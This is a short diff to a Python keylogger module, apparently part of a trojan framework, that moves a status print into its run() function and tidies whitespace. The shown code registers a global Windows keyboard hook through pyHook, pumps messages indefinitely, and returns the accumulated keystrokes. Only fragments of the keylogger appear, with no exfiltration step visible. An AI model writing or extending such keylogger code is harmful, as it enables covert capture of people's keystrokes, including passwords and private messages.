@@ -10,7 +10,6 @@ kernel32 = ctypes.windll.kernel32
 psapi = ctypes.windll.psapi
 current_window = None
 
-print("[*] We are in KeyLogger Module")
 global KeyLogs
 KeyLogs = ""
 start_time = time.time()
@@ -79,8 +78,10 @@ def KeyStroke(event):
     # pass execution to next hook registered
     return True
 
+
 def run(**args):
     global KeyLogs
+    print("[*] We are in KeyLogger Module")
     # create and register a hook manager
     kl = pyHook.HookManager()
     kl.KeyDown = KeyStroke
@@ -88,5 +89,5 @@ def run(**args):
     # register the hook and execute forever
     kl.HookKeyboard()
     win32gui.PumpMessages()
-    
+
     return(KeyLogs)
